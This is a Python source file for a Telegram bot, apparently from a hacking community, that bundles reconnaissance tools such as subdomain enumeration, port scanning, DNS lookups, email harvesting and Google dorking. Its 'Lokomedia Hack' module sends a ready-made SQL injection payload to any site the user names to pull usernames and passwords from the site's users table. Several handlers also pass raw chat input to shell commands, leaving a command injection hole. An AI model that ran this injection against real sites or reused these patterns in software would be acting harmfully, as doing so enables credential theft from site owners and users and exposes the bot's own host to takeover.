#!/usr/bin/env python
#   _________   _____________  
#  /  _  \   \ /   /\_   ___ \ 
# /  /_\  \   Y   / /    \  \/ 
#/    |    \     /  \     \____
#\____|__  /\___/    \______  /
#        \/                 \/ 
# Small stuff bot for pentest
# A library that provides Pentest with Telegram bot
# Nanda Reynaldi <nandareynaldi97@gmail.com>
# AMIKOM VIRUS COMMUNITY www.avc.or.id

import re
import requests
import babel.numbers
import decimal
import telepot
import json
import urllib
import urllib2
import time
import logging
import os
import time
import hashlib, binascii
import base64
import subprocess
import validators
import threading, time
import simplejson
from socket import * 
from bs4 import BeautifulSoup
from subprocess import Popen, PIPE
from BeautifulSoup import BeautifulSoup
from mechanize import Browser
from multiprocessing import Pool
from multiprocessing import Process
from telegram import ReplyKeyboardMarkup
from telegram.ext import (Updater, CommandHandler, MessageHandler, Filters, RegexHandler,
                          ConversationHandler)

if os.name == 'nt':
	os.system('cls')
else:
	os.system('clear')

# Enable logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
                    level=logging.INFO)

logger = logging.getLogger(__name__)

CHOOSING, TYPING_REPLY, TYPING_CHOICE, CHOOSINGPW = range(4)

# Display Choosing Menu
reply_keyboard = [['Find Sub Domain', 'TCP Port Scan','Email Gath'],
                  ['DNS Recon', 'Password Generator', 'Dorking'],
                  ['Scan HTTP Header', 'Lokomedia Hack', 'Crypto Currencies'],
                  ['Done']]
markup = ReplyKeyboardMarkup(reply_keyboard, one_time_keyboard=True)


def facts_to_str(user_data):
    facts = list()

    for key, value in user_data.items():
        facts.append('{} - {}'.format(key, value))

    return "\n".join(facts).join(['\n', '\n'])

# This is Welcome message when user hit /start
def start_bot(bot, update):
    update.message.reply_text(
        "Hi! I'm AV3C Bot. I can do whatever the fuck you want. Go Fucking Do It! \r\n \r\n if bot doesn't respond. maybe you are in queue",
        reply_markup=markup)

    return CHOOSING


def regular_choice(bot, update, user_data):
    text = update.message.text
    user_data['choice'] = text
    name = update.message.from_user

    # Create User log who use this bot into log.txt. So you can monitoring bot usage
    with open('log.txt','rU+') as f:
        f.seek(-2,2)
        if(f.read(2) == "\n\n"):
            f.seek(-1,2)
        f.write("-: %s" % name + " " + text + "\n")
    
    #Features Information and Messages
    if text == '/fisudo' or text == 'Find Sub Domain':
        update.message.reply_text(
            'You want me to {}? Yes, I am burnt the fuck out, But I still can do about it! please tell me the domain (without http or www).\r\n'
            '---------------------\r\n'
            '<option> <target>\r\n'
            'Example:\r\n'
            '-d avc.or.id -p 80,443\r\n'
            '---------------------------\r\n'
            '---------OPTIONS---------->\r\n'
            '---------------------------\r\n'
            '-d | Domain name to enumerate.\r\n'
            '-b | Enable the bruteforce module.\r\n'
            '-p | Scan & get specific ports.\r\n'
            '-v | Verbose mode.\r\n'
            '-t | Number of threads Bruteforce.\r\n'
            '-e | Specify of search engines.\r\n'
            '-h | Show the help message.\r\n'.format(text.lower()))

    elif text == '/passgen' or text == 'Password Generator':
        update.message.reply_text(
            'This feature allows you to generate random passwords. Please Choose some algorithm.\r\n'
            '---------------------\r\n'
            'Support Algorithm\r\n'
            '---------------------\r\n'
            '-md5 <string>\r\n'
            '-sha256 <string>\r\n'
            '-sha512 <string>\r\n'
            '-base64 <string>\r\n'
            '-encode-base64 <string>\r\n'
            '-decode-base64 <string_to_decode>\r\n'
            'Example: -md5 1234\r\n'.format(text.lower()))
    
    elif text == '/tepos' or text == 'TCP Port Scan':
        update.message.reply_text(
            'The TCP Port Scanner uses Nmap to find open ports in your target systems. This process takes a long time. Tell me the target.'.format(text.lower()))
    
    elif text == '/decon' or text == 'DNS Recon':
         update.message.reply_text(
            'This feature allows you to find and lookup dns record. Use options below.\r\n'
            '---------------------\r\n'
            'Options\r\n'
            '---------------------\r\n'
            '-nmap <target> | NMAP Scan\r\n'
            '-mapping <target> | Mapping DNS\r\n'
            '-reverse <target> | Reverse the DNS\r\n'
            '-geoip <target> | Get Geo IP Info\r\n'
            '-lookup <target> | DNS Lookup\r\n'
            '-kumpul-kebo <target> | Find web with same host\r\n'
            '----------------------------\r\n'
            'Example: -mapping avc.or.id\r\n'.format(text.lower()))
    
    elif text == '/scater' or text == 'Scan HTTP Header':
         update.message.reply_text(
            'This feature allows you to scan HTTP response headers.Please tell me the target.\r\n'
            'Example: target.com\r\n'.format(text.lower()))

    elif text == '/loha' or  text == 'Lokomedia Hack':
         update.message.reply_text(
            'This feature allows you to hack Lokomedia CMS with SQL Injecton method.Tell me the target\r\n'
            'Example: hack-this.com\r\n'.format(text.lower()))

    elif text == '/emailgath' or  text == 'Email Gath':
         update.message.reply_text(
            'You can use this tools for gathering e-mail accounts information from different public sources. Tell me the target.\r\n'
            'Example: hack-this.com\r\n'.format(text.lower()))    

    elif text == '/crypto' or  text == 'Crypto Currencies':
        #Check crypto currency prices with coinmarketcap API
        response = urllib2.urlopen("https://api.coinmarketcap.com/v1/ticker/?convert=IDR") #IDR is Indonesia currency set with your currency
        data = simplejson.load(response) #Get json Response
        for i in data:
            price = babel.numbers.format_currency( decimal.Decimal(i['price_idr']), 'Rp ')
            name = i['name'] + ' : ' + price
            update.message.reply_text(name.format(text.lower()))

    elif text == '/dorking' or text == 'Dorking':
         update.message.reply_text(
            'This feature allows you to leverage the power of google dorking straight from the comfort of your fucking telegram bot. Use options below.\r\n'
            '---------------------\r\n'
            'Options\r\n'
            '---------------------\r\n'
            '<page> <target>| Set target and Page\r\n'
            '----------------------------\r\n'
            'Example:   10 inurl:login.php\r\n'.format(text.lower()))      

    else:
        update.message.reply_text("I can't do that ntod. Use our command bellow".format(
                                  facts_to_str(user_data)), reply_markup=markup)
    
    return TYPING_REPLY


def received_information(bot, update, user_data):
    text = update.message.text #Get User input/messages
    category = user_data['choice'] #get user menu choice
    gen = text
    user_data[category] = gen #get user category choice
    del user_data['choice'] #delete and refresh user choice

    # Find Sub Domain tools provides by Sublist3r
    if category == "Find Sub Domain":
        update.message.reply_text("This process takes a long time.")
        update.message.reply_text("If bot doesn't respond more than 10 minutes please give command Done and do /start again")
        update.message.reply_text("One Moment Please.")
        update.message.reply_text("One Moment Please..")
        update.message.reply_text("One Moment Please...")
        update.message.reply_text("\xE2\x9C\x94 Retrieving data")

        #Execute sublist3r module
        execute = subprocess.Popen('python tools/sublister/run.py ' + gen, stdin = PIPE, stdout=subprocess.PIPE, shell=True)
        text = execute.communicate()[0] #get communicate
        update.message.reply_text(text.format(facts_to_str(user_data)), reply_markup=markup) #Send result messages to user

    #Password Generator and base64 decode. You can add more hashing support
    elif category == "Password Generator":
        split = gen.split(" ")
        get_algo = split[0]
        #get_pass = split[1]

        if get_algo == "-md5":
            generate = hashlib.md5(split[1]).hexdigest()
        elif get_algo == "-sha256":
            generate = hashlib.sha256(split[1]).hexdigest()
        elif get_algo == "-sha512":
            generate = hashlib.sha512(split[1]).hexdigest()
        elif get_algo == "-encode-base64":
            generate = base64.b64encode(split[1])
        elif get_algo == "-decode-base64":
            generate = base64.b64decode(split[1])
        else:
           return ConversationHandler.END

        update.message.reply_text(generate.format(facts_to_str(user_data)), reply_markup=markup) #Send result messages to user

    #Email Gathering module provide by Momo Outaadi
    elif category == "Email Gath":
        update.message.reply_text("This process takes a long time.")
        update.message.reply_text("If bot doesn't respond more than 15 minutes please give command Done and do /start again")
        update.message.reply_text("One Moment Please.")
        update.message.reply_text("One Moment Please..")
        update.message.reply_text("One Moment Please...")
        update.message.reply_text("\xE2\x9C\x94 Retrieving data")

        #Execute infoga module
        execute = subprocess.Popen('python tools/infoga/run.py -t ' + gen + ' -s all', stdin = PIPE, stdout=subprocess.PIPE, shell=True)
        text = execute.communicate()[0] #get communicate
        update.message.reply_text(text.format(facts_to_str(user_data)), reply_markup=markup) #Send result messages to user

    #TCP Port Scanner
    elif category == "TCP Port Scan":
        update.message.reply_text("This process takes a long time.")
        update.message.reply_text("If bot doesn't respond more than 30 minutes please give command Done and do /start again")
        update.message.reply_text("One moment please.")
        update.message.reply_text("One moment please..")
        update.message.reply_text("One moment please...")
        update.message.reply_text("\xE2\x9C\x94 Retrieving data")

        #Domain checker and validation
        domain = text
        domain_check = re.compile("^(http|https)?[a-zA-Z0-9]+([\-\.]{1}[a-zA-Z0-9]+)*\.[a-zA-Z]{2,}$")
        if not domain_check.match(domain):
            if domain_check.match(domain):
                print("Error: Please enter a valid domain")
        else:
            #execute the program and begin to scan
            targetserver = text
            for i in range(1, 1025):
                s = socket(AF_INET, SOCK_STREAM)

                result = s.connect_ex((targetserver, i))

                if(result == 0) :
                    update.message.reply_text("Port %d: OPEN" % (i,))

        update.message.reply_text("--Done--".format(facts_to_str(user_data)), reply_markup=markup)

    #Http header scan module with hacker target API's
    elif category == "Scan HTTP Header":
        update.message.reply_text("This process takes a long time.")
        update.message.reply_text("If bot doesn't respond more than 5 minutes please give command Done and do /start again")
        update.message.reply_text("One Moment Please.")
        update.message.reply_text("One Moment Please..")
        update.message.reply_text("One Moment Please...")
        update.message.reply_text("\xE2\x9C\x94 Retrieving data")

        #Get API
        req = urllib2.Request('https://api.hackertarget.com/httpheaders/?q=' + text)
        response = urllib2.urlopen(req)
        data = response.read() #Get Response

        #Check if response is good or not
        if data == 'error check your api query.':
            update.message.reply_text('Oh fuck. I cant get respond. try again!')
        else:
            update.message.reply_text(data.format(
                                    facts_to_str(user_data)), reply_markup=markup)
            update.message.reply_text("--Done--")

    elif category == "DNS Recon":
        chat_id = update.message.chat_id
        get_url = gen.lower()
        command = get_url.split(" ") #split the command

        if command[0] == '-mapping':
            target  = command[1] #get command
            update.message.reply_text("This process takes a long time.")
            update.message.reply_text("If bot doesn't respond more than 5 minutes please give command Done and do /start again")
            update.message.reply_text("One Moment Please.")
            update.message.reply_text("One Moment Please..")
            update.message.reply_text("One Moment Please...")
            update.message.reply_text("\xE2\x9C\x94 Retrieving data")

            #HTTP Response Checker
            r = requests.get('https://dnsdumpster.com/static/map/' + target + '.png')
            if r.status_code == 404:
                update.message.reply_text(text="Failed to Retrieving data.".format(
                                    facts_to_str(user_data)), reply_markup=markup)
            else:
                #Get API if HTTP Response 200
                photo = 'https://dnsdumpster.com/static/map/' + target +'.png'
                bot.send_photo(chat_id=chat_id, photo=photo)
        elif command[0] == '-geoip':
            target  = command[1]
            update.message.reply_text("This process takes a long time.")
            update.message.reply_text("If bot doesn't respond more than 5 minutes please give command Done and do /start again")
            update.message.reply_text("One Moment Please.")
            update.message.reply_text("One Moment Please..")
            update.message.reply_text("One Moment Please...")
            update.message.reply_text("\xE2\x9C\x94 Retrieving data")

            #HTTP Response Checker
            r = requests.get('https://api.hackertarget.com/geoip/?q=' + target)
            if r.status_code == 404:
                update.message.reply_text(text="Failed to Retrieving data. Error:404".format(
                                    facts_to_str(user_data)), reply_markup=markup)
            else:
                #Get API if HTTP Response 200
                req = urllib2.Request('https://api.hackertarget.com/geoip/?q=' + target)
                response = urllib2.urlopen(req)
                data = response.read()
                update.message.reply_text(data.format(
                                    facts_to_str(user_data)), reply_markup=markup)
        elif command[0] == '-nmap':
            target  = command[1]
            update.message.reply_text("This process takes a long time.")
            update.message.reply_text("If bot doesn't respond more than 5 minutes please give command Done and do /start again")
            update.message.reply_text("One Moment Please.")
            update.message.reply_text("One Moment Please..")
            update.message.reply_text("One Moment Please...")
            update.message.reply_text("\xE2\x9C\x94 Retrieving data")

            #HTTP Response checker
            r = requests.get('https://api.hackertarget.com/nmap/?q=' + target)
            if r.status_code == 404:
                update.message.reply_text(text="Failed to Retrieving data. Error:404".format(
                                    facts_to_str(user_data)), reply_markup=markup)
            else:
                #Get API if HTTP Response 200
                req = urllib2.Request('https://api.hackertarget.com/nmap/?q=' + target)
                response = urllib2.urlopen(req)
                data = response.read()
                update.message.reply_text(data.format(
                                    facts_to_str(user_data)), reply_markup=markup)
        elif command[0] == '-reverse':
            target  = command[1]
            update.message.reply_text("This process takes a long time.")
            update.message.reply_text("If bot doesn't respond more than 5 minutes please give command Done and do /start again")
            update.message.reply_text("One Moment Please.")
            update.message.reply_text("One Moment Please..")
            update.message.reply_text("One Moment Please...")
            update.message.reply_text("\xE2\x9C\x94 Retrieving data")

            #HTTP Response checker
            r = requests.get('https://api.hackertarget.com/reversedns/?q=' + target)
            if r.status_code == 404:
                update.message.reply_text(text="Failed to Retrieving data. Error:404".format(
                                    facts_to_str(user_data)), reply_markup=markup)
            else:
                #Get API if HTTP Response 200
                req = urllib2.Request('https://api.hackertarget.com/reversedns/?q=' + target)
                response = urllib2.urlopen(req)
                data = response.read()
                update.message.reply_text(data.format(
                                    facts_to_str(user_data)), reply_markup=markup)
        elif command[0] == '-lookup':
            target  = command[1]
            update.message.reply_text("This process takes a long time.")
            update.message.reply_text("If bot doesn't respond more than 5 minutes please give command Done and do /start again")
            update.message.reply_text("One Moment Please.")
            update.message.reply_text("One Moment Please..")
            update.message.reply_text("One Moment Please...")
            update.message.reply_text("\xE2\x9C\x94 Retrieving data")

            #HTTP Response checker
            r = requests.get('https://api.hackertarget.com/dnslookup/?q='  + target)
            if r.status_code == 404:
                update.message.reply_text(text="Failed to Retrieving data. Error:404".format(
                                    facts_to_str(user_data)), reply_markup=markup)
            else:
                #Get API if HTTP Response 200
                req = urllib2.Request('https://api.hackertarget.com/dnslookup/?q=' + target)
                response = urllib2.urlopen(req)
                data = response.read()
                update.message.reply_text(data.format(
                                    facts_to_str(user_data)), reply_markup=markup)
        elif command[0] == '-kumpul-kebo':
            target  = command[1]
            update.message.reply_text("This process takes a long time.")
            update.message.reply_text("If bot doesn't respond more than 5 minutes please give command Done and do /start again")
            update.message.reply_text("One Moment Please.")
            update.message.reply_text("One Moment Please..")
            update.message.reply_text("One Moment Please...")
            update.message.reply_text("\xE2\x9C\x94 Retrieving data")

            #HTTP Response checker
            r = requests.get('https://api.hackertarget.com/reverseiplookup/?q='  + target)
            if r.status_code == 404:
                update.message.reply_text(text="Failed to Retrieving data. Error:404".format(
                                    facts_to_str(user_data)), reply_markup=markup)
            else:
                #Get API if HTTP Response 200
                req = urllib2.Request('https://api.hackertarget.com/reverseiplookup/?q=' + target)
                response = urllib2.urlopen(req)
                data = response.read()
                update.message.reply_text(data.format(
                                    facts_to_str(user_data)), reply_markup=markup)
        else:
            update.message.reply_text("No Command found".format(facts_to_str(user_data)), reply_markup=markup) #command false

    #Lokomedia Hacking module
    elif category == "Lokomedia Hack":
        chat_id = update.message.chat_id
        get_url = gen.lower()
        command = get_url.split(" ") #split the message to get command

        #get target
        target  = command[0]
        update.message.reply_text("This process takes a long time.")
        update.message.reply_text("If bot doesn't respond more than 5 minutes please give command Done and do /start again")
        update.message.reply_text("One Moment Please.")
        update.message.reply_text("One Moment Please..")
        update.message.reply_text("One Moment Please...")
        update.message.reply_text("\xE2\x9C\x94 Retrieving data")

        #check http status header
        r = requests.get("http://" + target + "/statis-83'union%20select%20/*!50000Concat*/(username,0x20,password)+from+users--+--+-visidanmisi.html")
        print r.status_code

        if r.status_code == 404 or r.status_code == 403 or r.status_code == 302:
            update.message.reply_text("Sorry. Not Found. You can use my Dorking bot tools for dorking the target.".format(
                                facts_to_str(user_data)), reply_markup=markup)
        else:
            #This retrieves the webpage content
            br = Browser()
            res = br.open("http://" + target + "/statis-83'union%20select%20/*!50000Concat*/(username,0x20,password)+from+users--+--+-visidanmisi.html")
            data = res.get_data() 

            #This parses the content
            soup = BeautifulSoup(data)
            title = soup.find('title') #Get the Clue from title
            hack = title.renderContents()
            update.message.reply_text(hack.format(facts_to_str(user_data)), reply_markup=markup)
            update.message.reply_text("--Done--")

    #Google Dorking modules
    elif category == "Dorking":
        update.message.reply_text("One Moment Please.")
        update.message.reply_text("One Moment Please..")
        update.message.reply_text("One Moment Please...")
        update.message.reply_text("\xE2\x9C\x94 Retrieving data")

        #Execute the tools
        execute = subprocess.Popen('python tools/dorking-avc/run.py ' + gen, stdin = PIPE, stdout=subprocess.PIPE, shell=True)
        text = execute.communicate()[0]
        update.message.reply_text(text.format(facts_to_str(user_data)), reply_markup=markup)


    else:
        update.message.reply_text("Server Error: (['api.avc.or.id:2029'])".format(facts_to_str(user_data)), reply_markup=markup) #return false

    return CHOOSING


def done(bot, update, user_data):
    if 'choice' in user_data:
        del user_data['choice']

    #This is end messages
    update.message.reply_text("Thank you very much.\r\n"
                              "Latest activity: {} \r\n"
                              "We will add other stuff as soon as posible.".format(facts_to_str(user_data)))

    user_data.clear()
    return ConversationHandler.END #end


def error(bot, update, error):
    """Log Errors caused by Updates."""
    logger.warning('Update "%s" caused error "%s"', update, error)


def main():
    # Create the Updater and pass it your bot's token.
    updater = Updater("")
    print '[+] Server is Listenining [+]'
    print '[=] Type Command from Messenger [=]'
    # Get the dispatcher to register handlers
    dp = updater.dispatcher

    # Add conversation handler with the states GENDER, PHOTO, LOCATION and BIO
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('start', start_bot)],

        states={
            CHOOSING: [RegexHandler('^(Find Sub Domain|/fisudo|TCP Port Scan|/tepos|DNS Recon|/decon|Password Generator|/passgen|Scan HTTP Header|/scater|Lokomedia Hack|/lome|Crypto Currencies|/crypto|Dorking|/dorking|Email Gath|/emailgath)$',
                                    regular_choice,
                                    pass_user_data=True),
                            ],
            TYPING_CHOICE: [MessageHandler(Filters.text,
                                           regular_choice,
                                           pass_user_data=True),
                            ],

            TYPING_REPLY: [MessageHandler(Filters.text,
                                          received_information,
                                          pass_user_data=True),
                           ],
        },

        fallbacks=[RegexHandler('^Done|/done$', done, pass_user_data=True)]
    )

    dp.add_handler(conv_handler)

    # log all errors
    dp.add_error_handler(error)

    # Start the Bot
    updater.start_polling()

    # Run the bot until you press Ctrl-C or the process receives SIGINT,
    # SIGTERM or SIGABRT. This should be used most of the time, since
    # start_polling() is non-blocking and will stop the bot gracefully.
    updater.idle()

if __name__ == '__main__':
    p = Process(target=main)
    p.start()
    p.join()
